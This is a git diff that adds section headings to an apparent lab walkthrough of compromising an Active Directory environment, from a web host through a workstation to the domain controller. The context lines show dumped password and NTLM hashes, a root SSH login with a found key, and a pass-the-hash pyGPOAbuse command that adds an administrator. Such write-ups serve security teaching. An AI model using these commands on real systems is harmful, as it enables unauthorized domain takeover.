@@ -76,6 +76,7 @@ SMB         10.1.88.121     445    DC01             [+] hsm.local\:
 ```
 
 ## Web-01
+### Enumeration
 Browsing to `http://web-01:5000` reveals the "Odyssey Portal".
 
 ![Odyssey Portal](web01portal.png)
@@ -185,6 +186,7 @@ def login():
                     <a href="/login">Try Again</a>
 ```
 
+### Privilege Escalation
 After significant trial and error with process manipulation and attempting to manipulate the flask application. The attacker went back to the basics of what the breadcrumbs led to and discovered that the keypair worked for the root user.
 ```bash
 ✘ ssh root@web-01 -i ./id_ed25519
@@ -246,6 +248,7 @@ root:$6$Zr5DnQ61/ut9zkn9$frvbMJHQy2sV9i4sbjEHrHFn7M5QP9H8Ud.gVZN1cPzge75HtskzOdb
 ghill_sa:$6$Zr5DnQ61/ut9zkn9$frvbMJHQy2sV9i4sbjEHrHFn7M5QP9H8Ud.gVZN1cPzge75HtskzOdbymTJMLSZgLEPbTSeshCX46.5MvxLLB0:20409:0:99999:7:::
 ```
 ## WKST-01
+### Enumeration
 %% While the above crontab was connecting to the DC, the credentials were not valid as a local or active directory user. %%
 
 With the above credentials from crontab obtained, the attacker finds a foothold on the WKST-01 machine as a local user. 
@@ -428,6 +431,7 @@ bbarkinson:1021:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffb
 [*] Cleaning up...
 ```
 
+### Lateral Movement
 Taking all the above documentation and information the attacker will create three lists.
 
 `users.txt`
@@ -638,10 +642,13 @@ Closing writers
 2026-01-03T16:09:46.8196855+00:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 1/3/2026! Happy Graphing!
 ```
 
+## DC-01
+### Enumeration
 The attacker will move this file to the BloodHound server and begin identifying attack paths. Of which `bbarkinson` has GenericWrite on Finance Policy. This can be abused with [pygpoabuse](https://github.com/Hackndo/pyGPOAbuse).
 
 ![BloodHound Attack Path](./screenshots/bloodhoundpath.png)
 
+### Privilege Escalation
 This will modify the GPO to add a scheduled task that makes `bbarkinson` an Administrator.
 ```zsh
 ➜ python3 ~/tools/pyGPOAbuse/pygpoabuse.py -user 'HSM.LOCAL/bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -dc-ip 10.1.88.121 -gpo-id '526CDF3A-10B6-4B00-BCFA-36E59DCD71A2' -command "net localgroup Administrators IMCOMINGFORYOU$ /add" -f
